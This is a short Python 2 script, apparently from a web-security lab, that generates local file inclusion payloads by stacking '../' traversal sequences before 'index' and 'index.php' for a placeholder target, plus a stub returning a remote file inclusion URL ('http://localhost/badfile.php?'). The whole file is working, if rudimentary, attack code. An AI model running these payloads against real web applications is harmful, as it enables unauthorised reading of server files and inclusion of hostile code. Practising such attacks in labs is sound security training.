
BASE_URL = "http://target.com"

def generateLFI(url, depth = 1, filename="index"):
	payloadList = list()
	#finds index.php at base
	payload = ""
	
	#LFI
	numSlashes = url.count("/")
	for i in range(0,numSlashes-1):
		payload +="../"

	payloadList.append(payload + filename)
	payloadList.append(payload + filename + ".php")

	depthPayload = payload	
	for i in range(0,depth):
		depthPayload += "../"
		depthPayloadNoPHP = depthPayload + filename
		depthPayloadPHP = depthPayloadNoPHP + ".php"
		payloadList.append(depthPayloadNoPHP)
		payloadList.append(depthPayloadPHP)	
	return payloadList

def generateRFI():
	return "http://localhost/badfile.php?"

if __name__ == "__main__":
	
	url = "/serverside/lfi2.php"
	generateLFI(url,2, "index")
	print generateRFI()
